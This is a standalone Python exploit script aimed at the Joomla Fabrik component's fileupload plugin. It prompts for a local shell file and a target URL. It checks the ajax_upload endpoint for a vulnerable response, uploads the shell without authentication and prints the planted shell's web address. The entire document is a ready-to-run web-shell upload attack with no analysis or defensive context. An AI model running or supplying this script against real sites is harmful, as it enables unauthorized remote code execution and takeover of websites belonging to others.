import requests

name_php = input("[*] Shell Path: ")

target = input("[*] enter url target: ")

shell = open(name_php, "rb")

url = target+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"

files = {
    "file":shell
}

headers = {
    'User-Agent' : "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
    'Content_Type' : 'multipart/form-data',
    'Connection': 'keep-alive',
}

data = {
    "f_url":"",
    "f_alt":"",
    "f_title":"",
    "f_caption":"",
    "dirPath":"",
    "f_file":"",
    "component":""
}

s = requests.session()

r = s.get(url, headers=headers)

if r.status_code == 200 and '{"filepath":null,"uri":null}' in r.text:

    rr = s.post(url, headers=headers, files=files, data=data)

    if name_php in rr.text:

        print("[+] Com Fabrik", target+"/"+name_php)

    else:

        print("[-] Com Fabrik")

else:
    print("[-] Com Media")